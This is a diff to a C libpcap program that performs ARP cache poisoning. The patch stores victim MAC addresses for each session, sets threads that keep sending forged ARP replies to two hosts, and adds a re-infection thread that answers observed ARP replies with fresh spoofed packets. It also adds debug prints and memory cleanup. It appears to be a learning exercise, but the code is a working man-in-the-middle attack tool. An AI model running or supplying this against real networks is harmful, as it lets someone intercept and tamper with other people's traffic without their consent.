@@ -36,6 +36,8 @@ typedef struct all_info{
 	u_char myMac[6];
 	in_addr *all_src_ip;
 	in_addr *all_dst_ip;
+	u_char **all_srcMac;
+	u_char **all_dstMac;
 	int session_n;
 } all_info;
 
@@ -46,9 +48,9 @@ void printmac(u_char *srcMac)
 		srcMac[3], srcMac[4], srcMac[5]);	
 }
 
-void printip(u_char *ip)
+void printip(char *name, u_char *ip)
 {
-	printf("ip: %u.%u.%u.%u\n",ip[0], ip[1], ip[2], ip[3]);
+	printf("%s: %u.%u.%u.%u\n", name, ip[0], ip[1], ip[2], ip[3]);
 }
 
 void usage()
@@ -76,6 +78,7 @@ void GetMyInfo(char* dev,unsigned char *my_mac, struct in_addr *my_ip){
 void SendPacket(pcap_t* handle, in_addr *src_ip, in_addr *dst_ip, u_char *srcMac, u_char *dstMac, u_short opcode, const char *message)
 {	
 	/*
+	printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
 	printf("src_ip: %s\n",inet_ntoa(*src_ip));
 	printf("dst_ip: %s\n",inet_ntoa(*dst_ip));
 	printf("src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n",
@@ -85,8 +88,8 @@ void SendPacket(pcap_t* handle, in_addr *src_ip, in_addr *dst_ip, u_char *srcMac
 		dstMac[0], dstMac[1], dstMac[2],
 		dstMac[3], dstMac[4], dstMac[5]);
 	printf("%s\n", message);
+	printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
 	*/
-
 	unsigned char packet[ETHERMTU];
 	struct ether_header *eth_h;
 	struct ether_arp *arp_h;
@@ -156,6 +159,13 @@ void GetTargetMac(char *dev, in_addr *src_ip, in_addr *dst_ip, unsigned char *sr
 	      if(!memcmp(dst_ip, arp_h->arp_spa, 4))
 	      {
 	      	memcpy(dstMac, arp_h->arp_sha, 6);
+	      	/*
+	      	printf("*****************************\n");
+	      	printf("src ip: %s\n", inet_ntoa(*src_ip));
+	      	printf("dst ip: %s\n", inet_ntoa(*dst_ip));
+	      	printmac(dstMac);
+	      	printf("*****************************\n");
+	      	*/
 	      	pcap_close(handle);
 	      	return;
 	      }
@@ -186,6 +196,7 @@ void* ARPInfection_regular(void *pinfo)
 	GetTargetMac(info.dev, info.my_ip, info.src_ip, info.myMac, info.srcMac);
 	GetTargetMac(info.dev, info.my_ip, info.dst_ip, info.myMac, info.dstMac);
 
+	/*
 	printf("==============================\n");
 	printf("my_ip: %s\n", inet_ntoa(*info.my_ip));
 	printf("src_ip: %s\n",inet_ntoa(*info.src_ip));
@@ -194,6 +205,7 @@ void* ARPInfection_regular(void *pinfo)
 	printmac(info.srcMac);
 	printmac(info.dstMac);
 	printf("==============================\n");
+	*/
 
 	while(true)
 	{
@@ -213,10 +225,39 @@ void* ARPInfection_irregular(void *ainfo)
 
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(info->dev, BUFSIZ, 1, 1000, errbuf);
-	
+
 	if (handle == NULL) {
 	  fprintf(stderr, "couldn't open device %s: %s\n", info->dev, errbuf);
 	  exit(1);
+	}
+	/*
+	printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
+	printf("my_ip: %s\n",inet_ntoa(*(info->my_ip)));
+	printmac(info->myMac);
+	for (int i = 0; i < info->session_n; i++)
+		printf("%d: %s\n", i, inet_ntoa(info->all_src_ip[i]));
+	for (int i = 0; i < info->session_n; i++)
+		printf("%d: %s\n", i, inet_ntoa(info->all_dst_ip[i]));
+	printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
+	*/
+	for(int i = 0; i < info->session_n; i++)
+	{
+		GetTargetMac(info->dev, info->my_ip, &(info->all_dst_ip[i]), info->myMac, info->all_dstMac[i]);
+		GetTargetMac(info->dev, info->my_ip, &(info->all_src_ip[i]), info->myMac, info->all_srcMac[i]);
+		/*
+		printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
+		printmac(info->all_dstMac[i]);
+		printmac(info->all_srcMac[i]);
+		printf("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
+		*/
+		/*
+		printf("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n");
+		printf("%s\n", inet_ntoa(info->all_dst_ip[i]));
+		printmac(info->all_dstMac[i]);
+		printf("%s\n", inet_ntoa(info->all_src_ip[i]));
+		printmac(info->all_srcMac[i]);
+		printf("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n");
+		*/
 	}
 
 	while (true) {
@@ -244,18 +285,40 @@ void* ARPInfection_irregular(void *ainfo)
 	      for(int i = 0; i < info->session_n; i++)
 	      {
 	      	if(!memcmp((char*)&(info->all_dst_ip[i]), arp_h->arp_spa, 4) &&
-	      		!memcmp((char*)&(info->all_src_ip[i]), arp_h->arp_tpa, 4) && arp_h->ea_hdr.ar_op == ntohs(0x01)){
-	      		GetTargetMac(info->dev, info->my_ip, &(info->all_dst_ip[i]), info->myMac, dstMac);
-	      		SendPacket(handle, &(info->all_src_ip[i]), &(info->all_dst_ip[i]),
-	      			info->myMac, dstMac, 2, "Irregular");
+	      		!memcmp((char*)&(info->all_src_ip[i]), arp_h->arp_tpa, 4) && arp_h->ea_hdr.ar_op == ntohs(0x02)){
+	      		
+	      		sleep(0.5);
+
+	      		printf("***********infection*********\n");
+		      	printip("arp_spa", arp_h->arp_spa);
+		      	printip("arp_tpa", arp_h->arp_tpa);
+		      	printf("dst_ip: %s\n", inet_ntoa(info->all_dst_ip[i]));
+		      	printf("src_ip: %s\n", inet_ntoa(info->all_src_ip[i]));
+		      	printf("%d\n", memcmp((char*)&(info->all_dst_ip[i]), arp_h->arp_spa, 4));
+		      	printf("%d\n", memcmp((char*)&(info->all_src_ip[i]), arp_h->arp_tpa, 4));
+		      	printf("*****************************\n");
+
+	      		SendPacket(handle, &(info->all_dst_ip[i]), &(info->all_src_ip[i]),
+	      			info->myMac, info->all_srcMac[i], 2, "Irregular");
 	      		flag = 1;
 	      		break;
 	      	}
-	      	else if (!memcmp((char*)&(info->all_dst_ip[i]), arp_h->arp_spa, 4) &&
-	      		!memcmp((char*)info->all_dst_ip, arp_h->arp_tpa, 4) && arp_h->ea_hdr.ar_op == ntohs(0x01)){	
-	      		GetTargetMac(info->dev, info->my_ip, &(info->all_src_ip[i]), info->myMac, srcMac);
-	      		SendPacket(handle, &(info->all_dst_ip[i]), &(info->all_src_ip[i]),
-	      			info->myMac, srcMac, 2, "Irregular");
+	      	else if (!memcmp((char*)&(info->all_src_ip[i]), arp_h->arp_spa, 4) &&
+	      		!memcmp((char*)info->all_dst_ip, arp_h->arp_tpa, 4) && arp_h->ea_hdr.ar_op == ntohs(0x02)){	
+
+	      		sleep(0.5);
+
+	      		printf("***********infection*********\n");
+		      	printip("arp_spa", arp_h->arp_spa);
+		      	printip("arp_tpa", arp_h->arp_tpa);
+		      	printf("dst_ip: %s\n", inet_ntoa(info->all_dst_ip[i]));
+		      	printf("src_ip: %s\n", inet_ntoa(info->all_src_ip[i]));
+		      	printf("%d\n", memcmp((char*)&(info->all_dst_ip[i]), arp_h->arp_spa, 4));
+		      	printf("%d\n", memcmp((char*)&(info->all_src_ip[i]), arp_h->arp_tpa, 4));
+		      	printf("*****************************\n");
+	      		
+	      		SendPacket(handle, &(info->all_src_ip[i]), &(info->all_dst_ip[i]),
+	      			info->myMac, info->all_dstMac[i], 2, "Irregular");
 	      		flag = 1;
 	      		break;
 	      	}
@@ -300,7 +363,12 @@ int main(int argc, char *argv[])
 	target_ip = (struct in_addr*)malloc(session_n * sizeof(struct in_addr));
 	ainfo.all_src_ip = (struct in_addr*)malloc(session_n * sizeof(struct in_addr));
 	ainfo.all_dst_ip = (struct in_addr*)malloc(session_n * sizeof(struct in_addr));
-
+	ainfo.all_srcMac = (u_char**)malloc(session_n * sizeof(u_char*));
+	for(int i = 0; i < session_n; i++)
+		ainfo.all_srcMac[i] = (u_char*)malloc(6 * sizeof(u_char));
+	ainfo.all_dstMac = (u_char**)malloc(session_n * sizeof(u_char*));
+	for(int i = 0; i < session_n; i++)
+		ainfo.all_dstMac[i] = (u_char*)malloc(6 * sizeof(u_char));
 
 	for(int i = 0; i < session_n; i++)
 	{
@@ -325,6 +393,26 @@ int main(int argc, char *argv[])
 		memcpy(pinfo[i].myMac, LocalMac, 6);
 		memset(pinfo[i].srcMac, 0, 6);
 		memset(pinfo[i].dstMac, 0, 6);
+	}
+
+	memcpy(ainfo.dev, dev, sizeof(dev));
+	memcpy(ainfo.my_ip, (in_addr*)&LocalIP, 4);
+	memcpy(ainfo.myMac, LocalMac, 6);
+
+	ainfo.session_n = session_n;
+	
+	athr_id = pthread_create(&athread, NULL, ARPInfection_irregular, (void*)&ainfo);
+	
+	if (athr_id < 0)
+	{
+		perror("athread create error!!\n");
+		exit(1);
+	}
+	else
+		printf("athread create success!!\n");
+
+	for(int i = 0; i < session_n; i++)
+	{
 		thr_id[i] = pthread_create(&threads[i], NULL, ARPInfection_regular, (void*)&pinfo[i]);
 		if (thr_id[i] < 0)
 		{
@@ -334,34 +422,27 @@ int main(int argc, char *argv[])
 		else
 			printf("thread create success!!\n");
 	}
-
-	memcpy(ainfo.dev, dev, sizeof(dev));
-	memcpy(ainfo.my_ip, (in_addr*)&LocalIP, 4);
-	memcpy(ainfo.myMac, LocalMac, 6);
-	ainfo.session_n = session_n;
-	athr_id = pthread_create(&athread, NULL, ARPInfection_irregular, (void*)&ainfo);
-	if (athr_id < 0)
-	{
-		perror("athread create error!!\n");
-		exit(1);
-	}
-	else
-		printf("athread create success!!\n");
-
 /*
 	for(int i = 0; i < session_n; i++)
 		printf("%d: %s\n", i, inet_ntoa(ainfo.all_src_ip[i]));
 	for(int i = 0; i < session_n; i++)
 		printf("%d: %s\n", i, inet_ntoa(ainfo.all_dst_ip[i]));
 */
-
 	for(int i = 0; i < session_n; i++)
 		pthread_join(threads[i], NULL);
 	pthread_join(athread, NULL);
+
 	free(threads);
 	free(pinfo);
 	free(thr_id);
 	free(sender_ip);
 	free(ainfo.all_src_ip);
 	free(ainfo.all_dst_ip);
+	for (int i = 0; i < session_n; i++)
+	{
+		free(ainfo.all_srcMac[i]);
+		free(ainfo.all_dstMac[i]);
+	}
+	free(ainfo.all_srcMac);
+	free(ainfo.all_dstMac);
 }
